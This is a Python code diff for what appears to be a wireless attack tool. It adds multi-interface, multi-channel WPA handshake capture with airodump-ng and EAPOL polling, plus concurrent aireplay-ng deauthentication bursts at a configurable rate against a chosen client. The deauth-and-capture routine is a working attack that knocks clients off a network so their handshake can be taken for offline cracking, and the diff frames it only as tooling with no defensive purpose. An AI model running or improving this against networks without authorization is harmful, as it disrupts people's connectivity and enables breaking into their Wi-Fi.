@@ -221,6 +221,19 @@ def _capture_segments(first_cap_file: str) -> list[str]:
     return [first_cap_file]
 
 
+def delete_capture_segments(first_cap_file: str) -> list[str]:
+    """Delete generated .cap segments for a capture prefix."""
+    deleted = []
+    for path in _capture_segments(first_cap_file):
+        try:
+            if os.path.exists(path):
+                os.remove(path)
+                deleted.append(path)
+        except OSError as e:
+            logger.warning("Failed to delete capture segment %s: %s", path, e)
+    return deleted
+
+
 def _hash_capture_files(paths: list[str]) -> str:
     sha = hashlib.sha256()
     for path in paths:
@@ -358,9 +371,9 @@ async def poll_eapol(
 
 
 async def capture_passive(
-    mon_iface: str,
+    mon_iface: str | tuple[str, str],
     bssid: str,
-    channel: int,
+    channel: int | str | tuple[int, int],
     output_prefix: str,
     timeout: float = 300.0,
     mgr: Optional[SubprocessManager] = None,
@@ -380,9 +393,12 @@ async def capture_passive(
         mgr: Optional SubprocessManager instance
     """
     _mgr = mgr or get_manager()
+    ifaces = mon_iface if isinstance(mon_iface, tuple) else (mon_iface,)
+    channels = channel if isinstance(channel, tuple) else (channel,)
+    
     pcap_file = f"{output_prefix}-01.cap"
 
-    if "MOCK" in mon_iface:
+    if "MOCK" in ifaces[0]:
         # Simulated handshake capture sequence
         logger.info("[MOCK] Starting mock handshake capture simulation")
         if on_progress:
@@ -401,40 +417,63 @@ async def capture_passive(
             eapol_count=4,
         )
 
-    cmd = [
+    cmd1 = [
         "airodump-ng",
-        mon_iface,
+        ifaces[0],
         "--bssid", bssid,
-        "--channel", str(channel),
+        "--channel", str(channels[0]),
         "--write", output_prefix,
         "--output-format", "pcap",
-        "--write-interval", "1",  # Write PCAP every 1 second
+        "--write-interval", "1",
     ]
 
-    logger.info("Starting passive capture on ch%d for %s", channel, bssid)
-    proc = await _mgr.start_background(cmd)
-
-    # EAPOL detection runs as a separate task polling the PCAP file
-    eapol_task = asyncio.create_task(
+    logger.info("Starting passive capture on ch%s for %s", str(channels[0]), bssid)
+    procs = [await _mgr.start_background(cmd1)]
+    
+    tasks = [asyncio.create_task(
         poll_eapol(pcap_file, bssid, timeout=timeout, on_progress=on_progress)
-    )
+    )]
+
+    if len(ifaces) > 1 and len(channels) > 1:
+        cmd2 = [
+            "airodump-ng",
+            ifaces[1],
+            "--bssid", bssid,
+            "--channel", str(channels[1]),
+            "--write", f"{output_prefix}_sec",
+            "--output-format", "pcap",
+            "--write-interval", "1",
+        ]
+        logger.info("Starting secondary passive capture on ch%s for %s", str(channels[1]), bssid)
+        procs.append(await _mgr.start_background(cmd2))
+        tasks.append(asyncio.create_task(
+            poll_eapol(f"{output_prefix}_sec-01.cap", bssid, timeout=timeout, on_progress=None)
+        ))
 
     try:
-        # Wait for EAPOL detection or timeout
-        result = await eapol_task
+        results = await asyncio.gather(*tasks)
     finally:
-        await _mgr.kill_background(proc)
+        for p in procs:
+            await _mgr.kill_background(p)
 
-    return result
+    best_result = None
+    for r in results:
+        if r and r.status == "full":
+            return r
+        if r and r.status == "partial":
+            best_result = r
+            
+    return best_result
 
 
 async def capture_deauth(
-    mon_iface: str,
+    mon_iface: str | tuple[str, str],
     bssid: str,
     client: str,
-    channel: int,          # Must be explicit — never looked up dynamically
+    channel: int | str | tuple[int, int],          # Must be explicit — never looked up dynamically
     output_prefix: str,
     count: int = 10,
+    rate: int = 128,
     timeout: float = 300.0,
     mgr: Optional[SubprocessManager] = None,
     on_progress: Optional[Callable[[bool, bool, bool, bool, str], None]] = None,
@@ -464,17 +503,24 @@ async def capture_deauth(
     # Wait 1 second for capture to initialize before sending deauths
     await asyncio.sleep(1.0)
 
-    # Send deauth frames
-    deauth_cmd = [
-        "aireplay-ng",
-        "--deauth", str(count),
-        "-a", bssid,
-        "-c", client,
-        mon_iface,
-    ]
+    ifaces = mon_iface if isinstance(mon_iface, tuple) else (mon_iface,)
+    
+    # Send deauth frames on all interfaces
+    deauth_tasks = []
+    for iface in ifaces:
+        deauth_cmd = [
+            "aireplay-ng",
+            "--deauth", str(count),
+            "-x", str(rate),
+            "-a", bssid,
+            "-c", client,
+            iface,
+        ]
+        deauth_tasks.append(_mgr.run(deauth_cmd, timeout=30.0, check=False))
+        
     try:
-        await _mgr.run(deauth_cmd, timeout=30.0, check=False)
-        logger.info("Sent %d deauth frames to %s", count, client)
+        await asyncio.gather(*deauth_tasks)
+        logger.info("Sent %d deauth frames to %s on %d interfaces", count, client, len(ifaces))
     except Exception as e:
         logger.warning("Deauth failed: %s", e)
 
